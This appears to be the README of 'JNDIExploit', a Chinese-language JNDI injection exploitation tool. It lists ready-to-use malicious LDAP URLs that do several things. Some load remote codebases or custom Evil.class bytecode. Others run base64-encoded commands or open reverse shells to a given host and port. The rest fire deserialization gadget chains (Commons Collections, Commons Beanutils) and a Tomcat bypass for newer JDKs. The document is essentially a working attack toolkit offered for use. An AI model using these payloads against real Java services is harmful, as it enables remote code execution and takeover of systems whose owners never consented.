# JNDIExploit

JNDI 注入利用工具

目前支持以下功能

- DnsLog
- 命令执行
- 反弹 Shell
- 加载自定义 Class 字节码
- Tomcat Bypass 高版本 JDK
- LDAP 反序列化

## Usage

`/Ref` 表示 LDAP Reference 远程加载 codebase, 加上 `bypass=tomcat` 参数则会使用 Tomcat ELProcessor + BeanFactory Bypass 高版本 JDK

`/Deserialize` 表示 LDAP 反序列化

```bash
# DnsLog
ldap://127.0.0.1:1389/Ref/DnsLog,url=xxx.dnslog.cn

# 命令执行, 指定 type=base64 以使用 Base64 编码
ldap://127.0.0.1:1389/Ref/Exec,cmd=open -a Calculator
ldap://127.0.0.1:1389/Ref/Exec,cmd=b3BlbiAtYSBDYWxjdWxhdG9yCg==,type=base64

# Tomcat Bypass 高版本 JDK, 下同
ldap://127.0.0.1:1389/Ref/Exec,cmd=open -a Calculator,bypass=tomcat

# 从字符串/服务器上的某个路径加载自定义的 Class 字节码
ldap://127.0.0.1:1389/Ref/FromCode,code=<base64-java-bytecode>
ldap://127.0.0.1:1389/Ref/FromPath,path=/path/to/Evil.class

# 反弹 Shell, shell 参数指定 Shell 类型, 默认为 sh
ldap://127.0.0.1:1389/Ref/ReverseShell,host=127.0.0.1,port=4444,shell=bash

# CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1,cmd=open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1,cmd=b3BlbiAtYSBDYWxjdWxhdG9yCg==,type=base64
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1,host=127.0.0.1,port=4444

# CommonsCollectionsK2 反序列化 (4.0 + TemplatesImpl), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2,cmd=open -a Calculator

# CommonsCollectionsK3 反序列化 (3.1 + Runtime.exec), 仅支持命令执行
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3,cmd=open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3,cmd=b3BlbiAtYSBDYWxjdWxhdG9yCg==,type=base64

# CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上
ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4,cmd=open -a Calculator

# CommonsBeanutils1NoCC (1.9.4, 无需 commons-collections 依赖), 使用 TemplatesImpl, 支持命令和反弹 Shell
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC,cmd=open -a Calculator
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC,cmd=b3BlbiAtYSBDYWxjdWxhdG9yCg==,type=base64
ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils1NoCC,host=127.0.0.1,port=4444
```